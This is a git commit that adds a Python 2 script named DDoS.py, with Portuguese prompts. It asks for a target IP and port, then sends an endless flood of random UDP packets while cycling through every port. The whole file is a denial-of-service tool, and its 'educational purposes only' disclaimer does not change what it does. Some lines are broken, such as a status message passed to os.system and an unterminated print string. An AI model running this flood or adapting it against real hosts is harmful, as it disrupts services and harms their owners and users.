045d1fe5ca3d5e59aa904d3b68803b4910dc7cae
ChokoZNet <89229676+ChokoNetZ@users.noreply.github.com>
2021-09-09 14:39:30 -0400

    Update and rename main.py to DDoS.py

---
+++ DDoS.py
@@ -0,0 +1,39 @@
+print "Inicializado com sucesso!"
+import os
+import sys
+import time
+import random
+import socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+time.sleep(2)
+os.system("clear")
+print
+print 
+print "Choko DDoS"
+ip = raw_input("IP do alvo =  ")
+port = input("Porta =  ")
+print "Você tem certeza que deseja atacar o alvo? se sim digite qualquer tecla(A FERRAMENTA É APENAS PARA PROPÓSITOS EDUCACIONAIS, USE AO SEU RISCO!!!"
+os.system("clear")
+os.system("Ataque iniciado!")
+print "carregando...20%"
+time.sleep(1)
+print "carregando...30%"
+time.sleep(0.5)
+print "carregando...50%"
+time.sleep(1)
+print "carregando...80%"
+time.sleep(2)
+print "carregando...100%"
+time.sleep(3)
+print "carregado com sucesso!"
+time.sleep(0.5)
+print "
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Enviado %s sockets para %s porta:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
